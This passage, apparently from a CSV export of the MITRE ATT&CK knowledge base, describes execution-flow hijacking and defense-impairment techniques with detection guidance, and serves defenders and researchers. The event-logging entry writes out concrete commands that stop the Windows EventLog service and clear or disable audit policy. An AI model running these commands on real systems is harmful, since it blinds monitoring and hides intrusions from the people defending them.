On Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the <code>export</code> command, <code>setenv</code> function, or <code>putenv</code> function. Adversaries can also leverage [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) to export variables in a shell or set variables programmatically using higher level syntax such Python’s <code>os.environ</code>.

On Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. <code>LD_PRELOAD</code> can be set via the environment variable or <code>/etc/ld.so.preload</code> file.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries) Libraries specified by <code>LD_PRELOAD</code> are loaded and mapped into memory by <code>dlopen()</code> and <code>mmap()</code> respectively.(Citation: Code Injection on Linux and macOS)(Citation: Uninformed Needle) (Citation: Phrack halfdead 1997)(Citation: Brown Exploiting Linkers) 

On macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the <code>DYLD_INSERT_LIBRARIES</code> environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) ",https://attack.mitre.org/techniques/T1574/006,13 March 2020,30 March 2023,enterprise-attack,2.0,"Defense Evasion, Persistence, Privilege Escalation","Monitor for changes to environment variables and files associated with loading shared libraries such as <code>LD_PRELOAD</code> and <code>DYLD_INSERT_LIBRARIES</code>, as well as the commands to implement these changes.

Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.","Linux, macOS","Command: Command Execution, File: File Creation, File: File Modification, Module: Module Load, Process: Process Creation",True,T1574,,,User,,,,,"(Citation: Intezer HiddenWasp Map 2019),(Citation: trendmicro xcsset xcode project 2020),(Citation: ESET Ebury Oct 2017),(Citation: Unit 42 Hildegard Malware),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Anomali Rocke March 2019),(Citation: Apple Developer Doco Hardened Runtime)"
T1574.005,attack-pattern--70d81154-b187-45f9-8ec5-295d01255979,Hijack Execution Flow: Executable Installer File Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).

Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002). Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",https://attack.mitre.org/techniques/T1574/005,13 March 2020,26 March 2020,enterprise-attack,1.0,"Defense Evasion, Persistence, Privilege Escalation","Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.

Look for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.",Windows,"File: File Creation, File: File Modification, Module: Module Load, Process: Process Creation, Service: Service Metadata",True,T1574,,"Stefan Kanthak; Travis Smith, Tripwire","Administrator, User",,,,"Administrator, SYSTEM, User",",(Citation: Executable Installers are Vulnerable),(Citation: Powersploit)"
T1574.013,attack-pattern--a4657bc9-d22f-47d2-a7b7-dd6ec33f3dde,Hijack Execution Flow: KernelCallbackTable,"Adversaries may abuse the <code>KernelCallbackTable</code> of a process to hijack its execution flow in order to run their own payloads.(Citation: Lazarus APT January 2022)(Citation: FinFisher exposed ) The <code>KernelCallbackTable</code> can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once <code>user32.dll</code> is loaded.(Citation: Windows Process Injection KernelCallbackTable)

An adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code> by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) or [Process Injection](https://attack.mitre.org/techniques/T1055) into another process.

A pointer to the memory address of the <code>KernelCallbackTable</code> can be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code> [Native API](https://attack.mitre.org/techniques/T1106) function).(Citation: NtQueryInformationProcess) Once the pointer is located, the <code>KernelCallbackTable</code> can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>) set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.(Citation: Lazarus APT January 2022)

The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code> may also be restored to its original state by the rest of the malicious payload.(Citation: Lazarus APT January 2022) Use of the <code>KernelCallbackTable</code> to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.",https://attack.mitre.org/techniques/T1574/013,25 February 2022,22 March 2022,enterprise-attack,1.0,"Defense Evasion, Persistence, Privilege Escalation","Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious behaviors that could relate to post-compromise behavior.

Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances. for known bad sequence of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>WriteProcessMemory()</code> and <code>NtQueryInformationProcess()</code> with the parameter set to <code>ProcessBasicInformation</code> may be used for this technique.(Citation: Lazarus APT January 2022)",Windows,Process: OS API Execution,True,T1574,,,,,,,,"(Citation: FinFisher exposed ),(Citation: Lazarus APT January 2022),(Citation: Qualys LolZarus),"
T1574.007,attack-pattern--0c2d00da-7742-49e7-9928-4514e5075d32,Hijack Execution Flow: Path Interception by PATH Environment Variable,"Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line. 

Adversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.

For example, on Windows if an adversary places a malicious program named ""net.exe"" in `C:\example path`, which by default precedes `C:\Windows\system32\net.exe` in the PATH environment variable, when ""net"" is executed from the command-line the `C:\example path` will be called instead of the system's legitimate executable at `C:\Windows\system32\net.exe`. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: ExpressVPN PATH env Windows 2021)

Adversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the `$PATH` variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or modifying the `/etc/paths.d` folder contents.(Citation: uptycs Fake POC linux malware 2023)(Citation: nixCraft macOS PATH variables)(Citation: Elastic Rules macOS launchctl 2022)",https://attack.mitre.org/techniques/T1574/007,13 March 2020,03 October 2023,enterprise-attack,1.1,"Defense Evasion, Persistence, Privilege Escalation","Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as ""findstr,"" ""net,"" and ""python""). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.

Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","Linux, Windows, macOS","File: File Creation, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1574,Application Control,Stefan Kanthak,,,,,,"(Citation: Github PowerShell Empire),(Citation: GitHub PowerSploit May 2012),(Citation: PowerSploit Documentation),(Citation: Windows Commands JPCERT),(Citation: Vulnerability and Exploit Detector),(Citation: Microsoft Dynamic-Link Library Security),(Citation: Microsoft CreateProcess),(Citation: NSA MS AppLocker),(Citation: Microsoft Application Lockdown),(Citation: Microsoft Windows Defender Application Control),(Citation: Microsoft Using Software Restriction ),(Citation: SANS Application Whitelisting)"
T1574.008,attack-pattern--58af3705-8740-4c68-9329-ec015a7013c2,Hijack Execution Flow: Path Interception by Search Order Hijacking,"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.

Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.

For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument <code>net user</code>. An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then <code>cmd.exe /C net user</code> will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)

Search order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).",https://attack.mitre.org/techniques/T1574/008,13 March 2020,30 March 2023,enterprise-attack,1.0,"Defense Evasion, Persistence, Privilege Escalation","Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as ""findstr,"" ""net,"" and ""python""). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.

Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.
",Windows,"File: File Creation, File: File Modification, Process: Process Creation",True,T1574,,Stefan Kanthak,"Administrator, SYSTEM, User",,,,"Administrator, SYSTEM, User","(Citation: Github PowerShell Empire),(Citation: GitHub PowerSploit May 2012),(Citation: PowerSploit Documentation),(Citation: Windows Commands JPCERT),(Citation: Vulnerability and Exploit Detector),(Citation: Microsoft Dynamic-Link Library Security),(Citation: Microsoft CreateProcess),(Citation: NSA MS AppLocker),(Citation: Microsoft Application Lockdown),(Citation: Microsoft Windows Defender Application Control),(Citation: Microsoft Using Software Restriction ),(Citation: SANS Application Whitelisting)"
T1574.009,attack-pattern--bf96a5a3-3bce-43b7-8597-88545984c07b,Hijack Execution Flow: Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.

Service paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\unsafe path with space\program.exe</code> vs. <code>""C:\safe path with space\program.exe""</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\program files\myapp.exe</code>, an adversary may create a program at <code>C:\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)

This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",https://attack.mitre.org/techniques/T1574/009,13 March 2020,30 March 2023,enterprise-attack,1.1,"Defense Evasion, Persistence, Privilege Escalation","Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as ""findstr,"" ""net,"" and ""python""). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.

Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",Windows,"File: File Creation, File: File Modification, Process: Process Creation",True,T1574,,Stefan Kanthak,,,,,,"(Citation: Github PowerShell Empire),(Citation: GitHub PowerSploit May 2012),(Citation: PowerSploit Documentation),(Citation: Windows Commands JPCERT),(Citation: Vulnerability and Exploit Detector),(Citation: Microsoft Dynamic-Link Library Security),(Citation: Microsoft CreateProcess),(Citation: NSA MS AppLocker),(Citation: Microsoft Application Lockdown),(Citation: Microsoft Windows Defender Application Control),(Citation: Microsoft Using Software Restriction ),(Citation: SANS Application Whitelisting)"
T1574.010,attack-pattern--9e8b28c9-35fe-48ac-a14d-e6cc032dcbcd,Hijack Execution Flow: Services File Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",https://attack.mitre.org/techniques/T1574/010,12 March 2020,30 March 2023,enterprise-attack,1.0,"Defense Evasion, Persistence, Privilege Escalation","Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.

Look for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques. ",Windows,"File: File Creation, File: File Modification, Process: Process Creation, Service: Service Metadata",True,T1574,,"Stefan Kanthak; Travis Smith, Tripwire","Administrator, User",,,,"Administrator, SYSTEM, User","(Citation: F-Secure BlackEnergy 2014),(Citation: Executable Installers are Vulnerable),(Citation: Powersploit)"
T1574.011,attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c,Hijack Execution Flow: Services Registry Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)

If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).

Adversaries may also alter other Registry keys in the service’s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)

The <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service’s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)

Adversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\servicename\Parameters\ServiceDll</code>.(Citation: malware_hides_service)",https://attack.mitre.org/techniques/T1574/011,13 March 2020,30 March 2023,enterprise-attack,1.1,"Defense Evasion, Persistence, Privilege Escalation","Service changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. (Citation: Autoruns for Windows) Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.

Monitor processes and command-line arguments for actions that could be done to modify services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be changed through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data.",Windows,"Command: Command Execution, Process: Process Creation, Service: Service Modification, Windows Registry: Windows Registry Key Modification",True,T1574,Application Control,"Matthew Demaske, Adaptforward; Travis Smith, Tripwire","Administrator, User",,,,SYSTEM,"(Citation: McAfee Honeybee),"
T1562.002,attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a,Impair Defenses: Disable Windows Event Logging,"Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.

The EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\Local Policies\Audit Policy</code> for basic audit policy settings or <code>Security Settings\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)

Adversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the “Start” value in <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)

There are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the ""Start"" value in the key <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)

Additionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:”Account Logon” /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)

By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",https://attack.mitre.org/techniques/T1562/002,21 February 2020,18 September 2023,enterprise-attack,1.3,Defense Evasion,"Monitor processes and command-line arguments for commands that can be used to disable logging. For example, [Wevtutil](https://attack.mitre.org/software/S0645), `auditpol`, `sc stop EventLog`, and offensive tooling (such as [Mimikatz](https://attack.mitre.org/software/S0002) and `Invoke-Phant0m`) may be used to clear logs.(Citation: def_ev_win_event_logging)(Citation: evt_log_tampering)  

In Event Viewer, Event ID 1102 under the “Security” Windows Log and Event ID 104 under the “System” Windows Log both indicate logs have been cleared.(Citation: def_ev_win_event_logging) `Service Control Manager Event ID 7035` in Event Viewer may indicate the termination of the EventLog service.(Citation: evt_log_tampering) Additionally, gaps in the logs, e.g. non-sequential Event Record IDs, may indicate that the logs may have been tampered.

Monitor the addition of the MiniNT registry key in `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control`, which may disable Event Viewer.(Citation: def_ev_win_event_logging)",Windows,"Application Log: Application Log Content, Command: Command Execution, Process: Process Creation, Script: Script Execution, Sensor Health: Host Status, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification",True,T1562,Log analysis,"Lucas Heiligenstein; Prasanth Sadanala, Cigna Information Protection (CIP) - Threat Response Engineering Team",,,,,,"(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: DFIR Phosphorus November 2021),(Citation: Dragos Crashoverride 2018),(Citation: Wevtutil Microsoft Documentation),(Citation: def_ev_win_event_logging),(Citation: win_xml_evt_log)"
T1562.007,attack-pattern--77532a55-c283-4cd2-bc5d-2d0b65e9d88c,Impair Defenses: Disable or Modify Cloud Firewall,"Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004). 

Cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity, or remove networking limitations to support traffic associated with malicious activity (such as cryptomining).(Citation: Expel IO Evil in AWS)(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)

Modifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.",https://attack.mitre.org/techniques/T1562/007,24 June 2020,15 April 2023,enterprise-attack,1.2,Defense Evasion,Monitor cloud logs for modification or creation of new security groups or firewall rules.,IaaS,"Firewall: Firewall Disable, Firewall: Firewall Rule Modification",True,T1562,,Expel,,,,,,"(Citation: GitHub Pacu),(Citation: Expel IO Evil in AWS)"
T1562.008,attack-pattern--cacc40da-4c9e-462c-80d5-fd70a178b12d,Impair Defenses: Disable or Modify Cloud Logs,"An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.

For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality – for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user’s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)",https://attack.mitre.org/techniques/T1562/008,12 October 2020,15 October 2023,enterprise-attack,2.0,Defense Evasion,"Monitor logs for API calls to disable logging. In AWS, monitor for: <code>StopLogging</code> and <code>DeleteTrail</code>.(Citation: Stopping CloudTrail from Sending Events to CloudWatch Logs) In GCP, monitor for: <code>google.logging.v2.ConfigServiceV2.UpdateSink</code>.(Citation: Configuring Data Access audit logs)  In Azure, monitor for <code>az monitor diagnostic-settings delete</code>.(Citation: az monitor diagnostic-settings) Additionally, a sudden loss of a log source may indicate that it has been disabled. ","Azure AD, Google Workspace, IaaS, Office 365, SaaS","Cloud Service: Cloud Service Disable, Cloud Service: Cloud Service Modification, User Account: User Account Modification",True,T1562,,"Alex Soler, AttackIQ; Ibrahim Ali Khan; Janantha Marasinghe; Joe Gumke, U.S. Bank; Matt Snyder, VMware; Prasad Somasamudram, McAfee; Sekhar Sarukkai, McAfee; Syed Ummar Farooqh, McAfee",,,,,,"(Citation: GitHub Pacu),"
T1562.012,attack-pattern--562e9b64-7239-493d-80f4-2bff900d9054,Impair Defenses: Disable or Modify Linux Audit System,"Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.

Often referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by the parameters set in the `audit.conf` configuration file. Two primary ways to configure the log generation rules are through the command line `auditctl` utility and the file `/etc/audit/audit.rules`,  containing a sequence of `auditctl` commands loaded at boot time.(Citation: Red Hat System Auditing)(Citation: IzyKnows auditd threat detection 2022)

With root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with `auditd` daemon or use `systemctl` to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the `/etc/audit/audit.rules` or `audit.conf` files to ignore malicious activity.(Citation: Trustwave Honeypot SkidMap 2023)(Citation: ESET Ebury Feb 2014)",https://attack.mitre.org/techniques/T1562/012,24 May 2023,03 October 2023,enterprise-attack,1.0,Defense Evasion,,Linux,"Command: Command Execution, File: File Deletion, File: File Modification, Process: OS API Execution, Process: Process Modification",True,T1562,,Tim (Wadhwa-)Brown,,,,,,","
T1562.004,attack-pattern--5372c5fe-f424-4def-bcd5-d3a8e770f07b,Impair Defenses: Disable or Modify System Firewall,"Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.

Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](https://attack.mitre.org/techniques/T1571)).(Citation: change_rdp_port_conti)",https://attack.mitre.org/techniques/T1562/004,21 February 2020,28 February 2023,enterprise-attack,1.1,Defense Evasion,Monitor processes and command-line arguments to see if firewalls are disabled or modified. Monitor Registry edits to keys that manage firewalls.,"Linux, Windows, macOS","Command: Command Execution, Firewall: Firewall Disable, Firewall: Firewall Rule Modification, Windows Registry: Windows Registry Key Modification",True,T1562,Firewall,,,,,,,"(Citation: NCSC Cyclops Blink February 2022),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Novetta Blockbuster Loaders),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: US-CERT BADCALL),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: FoxIT Wocao December 2019),(Citation: ESET InvisiMole June 2018),(Citation: TrendMicro DarkComet Sept 2014),(Citation: Zscaler Kasidet),(Citation: Trend Micro njRAT 2018),(Citation: Novetta Blockbuster),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: TechNet Netsh Firewall),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: ESET Grandoreiro April 2020),(Citation: TechNet Netsh),(Citation: Talos ZxShell Oct 2014),(Citation: Fidelis njRAT June 2013),(Citation: US-CERT HARDRAIN March 2018),(Citation: DigiTrust NanoCore Jan 2017),(Citation: US-CERT TYPEFRAME June 2018),(Citation: Aqua TeamTNT August 2020),(Citation: Talos Rocke August 2018),(Citation: US-CERT TA18-074A),(Citation: FireEye APT30),(Citation: Novetta Blockbuster Tools),(Citation: Securelist Kimsuky Sept 2013),(Citation: Unit42 CookieMiner Jan 2019),(Citation: Group-IB Anunak),(Citation: DFIR Phosphorus November 2021),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: PaloAlto NanoCore Feb 2016),(Citation: Malwarebytes DarkComet March 2018),(Citation: Cisco H1N1 Part 2),(Citation: Trend Micro Cyclops Blink March 2022),"
